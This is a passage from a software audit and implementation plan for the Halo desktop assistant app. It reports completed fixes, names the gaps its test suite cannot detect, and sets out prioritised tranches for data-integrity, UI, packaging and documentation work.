action), and five third-person SR-only live-region strings rewritten to the design
language's first-person voice (two assertions updated). Left as explicit product
decisions: the 16px-vs-12px card-radius doc/code mismatch (code self-consistent at 12px,
no token to hang a fix on) and text-only loading states lacking the spec's spinner glyph.

**Tranche 1 (growth):** checkpoint pruning (newest 20/thread, only after a turn
*completes* so a Tier-3-suspended checkpoint is never a candidate); `action`
retention + `action(ts DESC)` index at **schema v4** (single-hop migration
preserved), exempting unconsumed undo tokens (tested, `[check 20]`); `_dirty`
popped after consolidation; `digest_cache` stale-sha eviction; the orb window's
`conversations` map LRU-capped at 100 in the reducer.

**Tranche 2 (correctness):** `file_read` size guard (fallback narrowed so
`MemoryError` can't trigger a second read); atomic temp-file + `os.replace` writes
preserving `newline=""`; page/sheet caps in extraction; `doc_digest` hashes before
extracting and never caches a degraded digest (`phase2_check` assertion inverted to
certify this at E2E); `_EMBED_LOCK` around embedder construction only;
`_release_deferred` front-drains; `_broadcast` closes a stalled socket; byte-compared
auth token; reserved-`id`-in-payload assertion in `_self_check`; `SpendUpdateMsg`
TypedDict fields + `check_contract_sync` extended to cover the TypedDicts;
`_MOCK_DISPATCH` enumeration test; `handle_skill_op` correlated `skill_not_found`
error (+ `skill_op → skill_name` in the server map and `"skill_op"` at the
`SkillsView` call site).

**New contract type `snapshot_complete`** (all three mirrors) — an authoritative
end-of-snapshot marker sent by the shared connect dispatcher (UI-only, both real and
mock paths). The reducer treats it as the immediate exit and keeps `spend_update` as
a backstop, so a path that omits the marker still converges rather than wedging.

**Tranche 3 (packaging):** runtime `repo_root()` (dev fallback kept); prefer a
bundled sidecar under `resource_dir()`, fall back to source-run (the PyInstaller
build step is the remaining deferred half, marked `// ponytail:`); Python-launcher
resolution mirroring `_python.ps1`; `CREATE_NO_WINDOW` + child stdio and diagnostics
routed to log files under `%LOCALAPPDATA%\Halo\` (with an `append_line` cap test);
a real restrictive CSP + `img` override in `Markdown.tsx`; the `kill()`-failure branch
re-enters the backoff ladder; healthy-uptime-reset unit test; two dead npm plugin
deps dropped (crates kept).

**Tranche 4 (docs):** the 5 stale status claims corrected (docs 14/03 shipped-not-
unbuilt, `CLAUDE.md` `deriveOrbState`/`focusTarget`, Tier-1 activity in
`04-permissions.md` — corrected to the *honest* finding that Tier 1 and Tier 2 are
currently indistinguishable in the Brain and `narrate` is hardcoded false, not the
first-draft claim that narration discriminates them; PHASE3 bugs #4/#5 marked fixed);
`mammoth.convert_to_markdown` → HTML + existing `markdownify`.

**Two things the audit's own §1 baseline got wrong, found while implementing:**
`tsc` was *not* clean (a `usePendingConfirm.test.tsx` type error Vitest never
typechecked — fixed), and `phase2_check`'s `doc_digest` assertion certified the very
degraded-cache behaviour Tranche 2 removes (inverted).

---

## 6. What the green suite structurally cannot see

This is the through-line and the most useful part of the audit.

- **`_release_deferred` is never called by any test.** The test written *for
  the interleave bug* (`test_server.py:223`) reimplements the drain inline
  instead of calling the function — so the half of the bug that remains has
  zero coverage. Its own docstring admits the racing version "proved nothing."
- **No gate ever compares restored bytes to original bytes.** `phase2_check`'s
  undo round-trip asserts `not p.exists()`. That is why both P0 newline bugs
  survive a fully green run.
- **The P0-1 path is untestable as written.** `check_vector_search_synthetic`
  seeds exactly two beliefs, both active — it can never observe dead rows
  crowding `k`, an unindexed active belief, or the empty-result path.
- **D1 (turn token ceiling) never executes.** The stub always records
  `prompt_tokens: 0`, so the ceiling cannot trip in any automated run.
- **D2 suppression never executes.** The 8-round test uses a tool that isn't
  in `_READONLY_TOOLS`.
- **Nothing asserts a bound on any table** — not checkpoints, not `action`,
  not `_dirty`, not `_pending`. All four growth findings are invisible by
  construction.
- **Assertions that cannot fail:** `phase2_check.py:325` asserts filenames the
  *tool itself* stamps in; `:326` bounds tokens two orders of magnitude above
  the achievable value; the "snapshot idempotence" checks in both phase1 and
  phase2 connect twice with no mutation between, proving determinism rather
  than idempotence.
- **The backoff ladder's healthy-uptime reset has no test** — the table is
  pinned, the behaviour that actually decides 1s-vs-30s is inline and untested.
- **"Stable" is still a debug build.** `tauri.stable.conf.json` differs from
  the base config in exactly one meaningful key (`beforeDevCommand`), and both
  run `tauri dev`. Everything gated on `debug_assertions` — including P1's
  console windows and the loss of all diagnostics — is invisible in every
  documented run path.

---

## 7. Implementation plan

Ordered by damage-now, then by what unblocks Phase 3a. Each tranche ends at a
full `./dev.ps1 -Verify` green.

### Tranche 0 — stop the bleeding (do first, today)

These four are live data-integrity bugs. Total diff is small.

1. **P0-2/P0-3 newline fidelity** — `newline=""` on the create write and both
   edit read/write. Then add the test that would have caught it: a gate
   assertion comparing **bytes** before delete and after undo, for a CRLF file
   and an LF file. This one test is worth more than the rest of the tranche.
2. **P0-1 memory retrieval** — the `if rows:` fallthrough, the `_unindex`
   helper at four call sites, and the lazy back-fill. Then the test: seed
   `k+1` beliefs, archive the `k` nearest, assert the surviving active one is
   still returned. **After the fix, back-fill this machine's DB** — the 8
   active beliefs are currently unindexed and will stay that way.
3. **P0-4 `dir_organize` partial failure** — per-move catch returning a
   partial result so the inverse still records what moved.
4. **`voice/tests/test_client.py` isolation** — three lines setting
   `LOCALAPPDATA`/`HALO_LLM_STUB` before importing `brain.server`. It is a
   documented command that writes to the user's real database.
5. **P0-5 Settings key lock** — pass a real predicate (or make
   `usePendingConfirm` default to unlock-on-change for primitive collections)
   so saving/removing the OpenRouter key isn't a permanent freeze. Every key
   entry hits this. Add the missing save→confirm→unlock test.

### Tranche 0b — UI rule-3 hangs (small, user-facing, do with Tranche 0)

6. **P1 dispatch-throw** — give `dispatch` a return value; make rule-3 callers
   check it *before* locking (send-then-lock). One shared fix covers all 11
   senders and the approval-card dead-modal. Do **not** just move
   `parseIpcMessage` into the existing catch — that would queue the rejected
   frame for reconnect flush.
7. **P1 `hello_ack` flush throw** — wrap the flush in try/catch and `ws.close()`
   on failure so the reconnect ladder takes over.

### Tranche 0c — one-line dependency + UX fixes (trivial, high-value)

8. **Pin `langgraph>=1.0,<2`** and **declare `aiosqlite`** in
   `brain/pyproject.toml`. The pin prevents a clean install landing on 0.2.x
   where Tier-3 approvals silently fail to rehydrate; the declaration stops
   relying on a transitive edge. Both are manifest one-liners.
9. **P0-6 approval overlay** — `pointer-events:none` on the overlay wrapper,
   re-enabled on `.approval-card`, so a pending approval stops blocking the
   composer.
10. **P0-7 link contrast / `color-scheme`** — an anchor color token + declare
    `color-scheme` so links are legible and native controls match the theme.

### Tranche 0d — UI/UX layout & a11y (do before any user testing)

11. **P0-8 capsule overflow** — narration must truncate so the mic cluster
    stays visible at 360px (`ui_ux/04-voice.md:17`).
12. Composer auto-grow (fixes dead `max-height:160px`, restores `Shift+Enter`);
    stop approvals stealing composer focus (arms Deny under a keystroke);
    `min-width:0` on card-title flex children; `--tier-3-text` at the three
    misusing sites; un-clip the Status-strip Stop button at `minWidth:720`.
13. Decide on the **Midnight-Blue backdrop** — either implement `--canvas`/
    `--midnight` (the stated identity) or delete the dead tokens and update the
    spec. Same for `--motion-slow` / view-switch transitions.
14. Real a11y coverage for `ApprovalCard` (alertdialog, focus, hold gesture) and
    the other seven uncovered surfaces; work the 12 WCAG blockers.

### Tranche 1 — unbounded growth (before any long session)

5. Checkpoint pruning (newest N per thread) — the largest disk offender.
6. `action` retention + `action(ts DESC)` index, exempting unconsumed undo tokens.
7. `_dirty.pop` after a successful consolidation; arm the idle timer on the
   pressure path too.
8. `digest_cache` eviction of stale-sha rows.

### Tranche 2 — correctness hardening

9. `file_read` size guard (and narrow the fallback so `MemoryError` can't
   trigger a second full read).
10. Atomic write (temp + `os.replace`) shared by `_file_edit`/`_file_create`.
11. Page/sheet caps in `extract.py`; hash-before-extract in `doc_digest`;
    don't cache degraded digests.
12. `_release_deferred` drain ordering; close the socket on the `_broadcast`
    timeout path; byte-compare the auth token.
13. `_EMBED_LOCK` around embedder construction.
14. Reserved-`id` assertion in `_self_check`; `SpendUpdateMsg` fields;
    `_MOCK_DISPATCH` enumeration test; `handle_skill_op` correlated error.

### Tranche 3 — before packaging (these are the packaging blockers)

15. `repo_root()` — `env!("CARGO_MANIFEST_DIR")` is compile-time; a shipped
    binary contains *this machine's* checkout path. Hard blocker.
16. `python -m brain` → bundled sidecar binaries via `resource_dir()`. Hard
    blocker. Resolves the hardcoded-`python` P1 for free.
17. `CREATE_NO_WINDOW`, **paired with** routing child stdio and every
    `eprintln!` to log files under `%LOCALAPPDATA%\Halo\`. Do the logging
    first — it is the tool you will need to debug 15 and 16.
18. Set a real CSP; add an `img` override in `Markdown.tsx`.
19. Fix the `kill()`-failure branch to re-enter the backoff ladder.

### Tranche 4 — doc corrections (all discovery now complete)

20. **Fix the 5 stale status claims in §5b** — docs 14 and 03 declaring shipped
    work unbuilt is the actively-misleading pair; do those first. No secret and
    no dead code were found, so there is nothing to delete and no ponytail
    comment to prune.
21. Doc updates already identified out-of-band: Tier-1 activity in
    `04-permissions.md`, the stale `deriveOrbState`/`focusTarget` lines in
    `CLAUDE.md`, deprecated `mammoth.convert_to_markdown` → `markdownify`, drop
    the two dead npm plugin deps, and gate coverage for the contract-1.1
    memory-history path.

### Not recommended

Do not act on the `_cap_result` dead-list-branch, `_execute_tail`'s dead
`out == []` branch, or the vestigial `_decay_task` global as standalone work —
fold them into whichever tranche already touches those files. And do not
revert the Tier-1 activity broadcast; update the design doc to match.
